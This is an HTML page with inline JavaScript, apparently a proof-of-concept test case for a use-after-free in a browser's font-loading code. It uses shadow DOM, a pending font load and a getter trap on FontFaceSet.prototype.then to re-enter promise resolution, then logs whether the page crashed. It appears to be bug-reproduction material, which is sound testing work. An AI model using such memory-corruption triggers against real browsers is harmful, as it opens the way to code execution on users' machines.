<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>UAF-86074ba - Action B</title></head>
<body>
<div id="o"></div>
<script>
var o = document.getElementById("o");
function L(s) { o.textContent += s + "\n"; }

window.addEventListener("load", function () { setTimeout(run, 0); });

function run() {
  var pre = document.createElement("div");
  document.body.appendChild(pre);
  pre.attachShadow({ mode: "open" });

  var host = document.createElement("div");
  document.body.appendChild(host);
  var sr = host.attachShadow({ mode: "open" });

  var s1 = document.createElement("style");
  s1.textContent =
    "@font-face{font-family:'pf';src:url('nosource.otf')}" +
    ":host>span{font-family:'pf';font-size:20px;display:block}";
  sr.appendChild(s1);

  var span = document.createElement("span");
  span.textContent = "X";
  sr.appendChild(span);

  var suf = document.createElement("div");
  document.body.appendChild(suf);
  suf.attachShadow({ mode: "open" });

  void host.getBoundingClientRect();

  var fs = document.fonts;
  L("status=" + fs.status);

  if (fs.status !== "loading") {
    L("ABORT: promise already resolved");
    return;
  }

  void fs.ready;

  Object.defineProperty(FontFaceSet.prototype, "then", {
    configurable: true,
    get: function () {
      L("TRAP FIRED [Action B]");

      try {
        var fb = new FontFace("b", "url(nosource.otf)");
        fb.load();
        document.fonts.add(fb);
      } catch (e) {
        L("err B: " + e);
      }

      delete FontFaceSet.prototype.then;
      return undefined;
    }
  });

  var s2 = document.createElement("style");
  s2.textContent =
    "@font-face{font-family:'pf';src:url('nosource.otf')}" +
    ":host>span{font-family:'pf';font-size:20px;display:block}";
  sr.prepend(s2);

  L("trigger");
  void document.body.offsetWidth;

  L("no crash");
}
</script>
</body>
</html>
